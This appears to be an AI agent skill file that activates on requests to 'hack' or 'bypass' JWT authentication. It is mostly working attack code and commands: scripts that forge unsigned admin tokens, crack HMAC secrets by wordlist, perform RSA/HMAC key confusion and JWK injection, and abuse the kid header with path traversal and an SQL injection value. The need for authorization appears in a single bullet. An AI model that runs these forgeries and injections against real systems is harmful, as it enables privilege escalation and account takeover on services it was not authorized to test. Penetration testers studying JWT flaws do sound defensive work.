---
name: JWT Security Testing
description: This skill should be used when the user asks to "test JWT security", "hack JWT tokens", "bypass JWT authentication", "crack JWT secrets", or "exploit JWT vulnerabilities". It provides comprehensive JSON Web Token attack techniques and security assessment methodologies.
version: 1.0.0
tags: [jwt, authentication, web-security, token, penetration-testing, api-security]
---

# JWT Security Testing

## Purpose

Identify and exploit vulnerabilities in JSON Web Token (JWT) implementations, including algorithm confusion attacks, secret key cracking, signature bypass, and claim manipulation. JWTs are widely used for authentication and authorization, making them high-value targets for security testing.

## Prerequisites

### Required Tools
- jwt_tool (Python JWT manipulation)
- Burp Suite with JWT extensions
- Hashcat or John the Ripper for cracking
- Python with PyJWT library
- jwt.io for decoding

### Required Knowledge
- JWT structure and claims
- Cryptographic signing algorithms
- HTTP authentication mechanisms
- Base64 encoding

## Outputs and Deliverables

1. **JWT Vulnerability Assessment** - Identified weaknesses in implementation
2. **Exploitation Proof** - Forged tokens demonstrating bypass
3. **Secret Key Recovery** - Cracked HMAC secrets
4. **Remediation Guidance** - Secure implementation recommendations

## Core Workflow

### Phase 1: Understanding JWT Structure

JWT consists of three Base64URL-encoded parts:

```
Header.Payload.Signature
```

Example JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Claims):**
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "admin": false
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

Common claims:
- `iss` - Issuer
- `sub` - Subject
- `aud` - Audience
- `exp` - Expiration time
- `iat` - Issued at
- `nbf` - Not before
- `jti` - JWT ID

### Phase 2: JWT Reconnaissance

Identify and decode JWTs:

```bash
# Decode JWT parts
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Using jwt_tool
jwt_tool <token>

# Using Python
python3 -c "
import base64
import json

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"

# Online decoder
# https://jwt.io
```

Look for:
- Algorithm used (HS256, RS256, etc.)
- Sensitive claims (admin, role, permissions)
- Expiration settings
- Key ID (kid) header

### Phase 3: None Algorithm Attack

Exploit servers that accept unsigned tokens:

```bash
# Using jwt_tool
jwt_tool <token> -X a

# Manual exploitation
# Original header:
{"alg": "HS256", "typ": "JWT"}

# Modified header:
{"alg": "none", "typ": "JWT"}

# Python script for none algorithm
python3 << 'EOF'
import base64
import json

# Modified header with none algorithm
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234567890", "name": "Admin", "admin": True, "iat": 1516239022}

# Encode header and payload
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create token without signature
token = f"{header_b64}.{payload_b64}."
print(token)
EOF
```

Variations to try:
```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

### Phase 4: Secret Key Brute-Force

Crack weak HMAC secrets:

```bash
# Using jwt_tool with dictionary
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
# First, format token for hashcat
echo '<token>' > jwt.txt

# Hashcat mode 16500 for JWT
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using John the Ripper
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Python brute-force script
python3 << 'EOF'
import jwt
import sys

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
    for line in f:
        secret = line.strip()
        try:
            jwt.decode(token, secret, algorithms=['HS256'])
            print(f"[+] Found secret: {secret}")
            break
        except:
            pass
EOF
```

Common weak secrets:
- `secret`
- `password`
- `123456`
- `jwt_secret`
- Company name or domain

### Phase 5: Algorithm Confusion Attack

Exploit RSA/HMAC key confusion:

```bash
# If server uses RS256 but accepts HS256
# Sign with public key as HMAC secret

# Download public key
curl -s http://target.com/.well-known/jwks.json

# Using jwt_tool
jwt_tool <token> -X k -pk public.pem

# Python exploitation
python3 << 'EOF'
import jwt
import json

# Read public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Create payload with elevated privileges
payload = {
    "sub": "admin",
    "admin": True,
    "exp": 9999999999
}

# Sign using HS256 with public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
EOF
```

### Phase 6: JWK Header Injection

Inject attacker-controlled key in token:

```bash
# Using jwt_tool for JWK injection
jwt_tool <token> -X i

# Create token with embedded JWK
python3 << 'EOF'
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import json
import base64

# Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Extract public key components for JWK
public_numbers = public_key.public_numbers()
n = base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).decode().rstrip('=')
e = base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).decode().rstrip('=')

# Create header with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": n,
        "e": e
    }
}

payload = {"sub": "admin", "admin": True}

# Sign with our private key
token = jwt.encode(payload, private_key, algorithm='RS256', headers=header)
print(token)
EOF
```

### Phase 7: KID (Key ID) Injection

Exploit key ID parameter for path traversal or injection:

```bash
# Path traversal via kid
# Header:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
# Sign with empty string since /dev/null is empty

# SQL injection via kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'secret' --"
}

# Using jwt_tool for kid exploitation
jwt_tool <token> -X k -pk /dev/null

# Python path traversal attack
python3 << 'EOF'
import jwt
import json
import base64

header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../dev/null"
}

payload = {"sub": "admin", "admin": True}

# Sign with empty secret (content of /dev/null)
token = jwt.encode(payload, "", algorithm='HS256', headers=header)
print(token)
EOF
```

### Phase 8: Claim Manipulation

Modify token claims for privilege escalation:

```bash
# Using jwt_tool to tamper claims
jwt_tool <token> -T

# Modify specific claim
jwt_tool <token> -I -pc admin -pv true

# Change user role
jwt_tool <token> -I -pc role -pv administrator

# Python claim manipulation (requires valid signature)
python3 << 'EOF'
import jwt

# Decode without verification
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
payload = jwt.decode(token, options={"verify_signature": False})
print("Original:", payload)

# Modify claims
payload['admin'] = True
payload['role'] = 'administrator'

# Re-encode (need valid secret)
new_token = jwt.encode(payload, "known_secret", algorithm='HS256')
print("Modified token:", new_token)
EOF
```

Claims to target:
- `admin`, `isAdmin`, `is_admin`
- `role`, `roles`, `user_role`
- `permissions`, `scope`
- `user_id`, `uid`, `sub`
- `email`, `username`

### Phase 9: JWT Tool Comprehensive Testing

Use jwt_tool for full vulnerability scan:

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install -r requirements.txt

# Full vulnerability scan
python3 jwt_tool.py <token> -M at

# Specific attacks:
# -X a : Alg:none attack
# -X n : Null signature attack  
# -X b : Blank password attack
# -X s : Sign with key file
# -X k : Key confusion attack
# -X i : Inject JWK
# -X p : PKCS11 padding oracle

# Tamper mode
python3 jwt_tool.py <token> -T

# Crack secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Generate new token with modifications
python3 jwt_tool.py <token> -I -pc admin -pv true -S hs256 -p "secret"
```

### Phase 10: Burp Suite JWT Testing

Configure Burp for JWT testing:

```
1. Install JSON Web Tokens extension
   - BApp Store > JSON Web Tokens

2. Capture request with JWT
   - JWT appears in Authorization header or cookie

3. JWT tab in message editor
   - Decode and view claims
   - Modify claims directly
   - Re-sign with key

4. JWT Scanner extension
   - Automatically test for vulnerabilities
   - None algorithm
   - Algorithm confusion
   - Weak keys

5. Intruder attacks
   - Fuzz claim values
   - Test algorithm variations
```

## Quick Reference

### JWT Algorithms

| Algorithm | Type | Description |
|-----------|------|-------------|
| HS256 | Symmetric | HMAC with SHA-256 |
| HS384 | Symmetric | HMAC with SHA-384 |
| HS512 | Symmetric | HMAC with SHA-512 |
| RS256 | Asymmetric | RSA with SHA-256 |
| RS384 | Asymmetric | RSA with SHA-384 |
| RS512 | Asymmetric | RSA with SHA-512 |
| ES256 | Asymmetric | ECDSA with SHA-256 |
| none | None | No signature |

### Common Attack Summary

| Attack | Vulnerability | Payload |
|--------|---------------|---------|
| None Algorithm | Accepts unsigned tokens | `"alg": "none"` |
| Secret Cracking | Weak HMAC secret | Brute-force |
| Key Confusion | RSA key as HMAC secret | Sign with public key |
| JWK Injection | Trusts embedded keys | Embed attacker JWK |
| KID Injection | Unvalidated kid | Path traversal/SQLi |

### jwt_tool Commands

| Command | Purpose |
|---------|---------|
| `jwt_tool <token>` | Decode and analyze |
| `jwt_tool <token> -T` | Tamper mode |
| `jwt_tool <token> -C -d wordlist.txt` | Crack secret |
| `jwt_tool <token> -X a` | None algorithm attack |
| `jwt_tool <token> -X k -pk key.pem` | Key confusion attack |
| `jwt_tool <token> -M at` | All tests mode |

## Constraints and Limitations

### Attack Limitations
- Strong secrets resist brute-force
- Proper algorithm validation blocks confusion attacks
- Short expiration limits replay window
- Server-side validation may catch tampering

### Testing Considerations
- Obtain authorization before testing
- Some attacks require valid tokens first
- Rate limiting may restrict brute-force attempts
- Production tokens may have short validity

### Secure Implementation Detection
- Algorithm whitelist enforcement
- Strong, rotated secrets
- Proper key separation (RSA/HMAC)
- Claim validation on server

## Troubleshooting

### Token Rejected After Modification

**Solutions:**
1. Verify signature algorithm matches
2. Check expiration hasn't passed
3. Ensure base64 encoding is correct
4. Validate claim format expectations

### Secret Cracking Too Slow

**Solutions:**
1. Use hashcat with GPU acceleration
2. Try targeted wordlists first
3. Check for common secrets manually
4. Consider rainbow tables if available

### Algorithm Confusion Not Working

**Solutions:**
1. Verify server uses asymmetric algorithm
2. Ensure public key format is correct
3. Try different algorithm variations
4. Check for algorithm whitelist
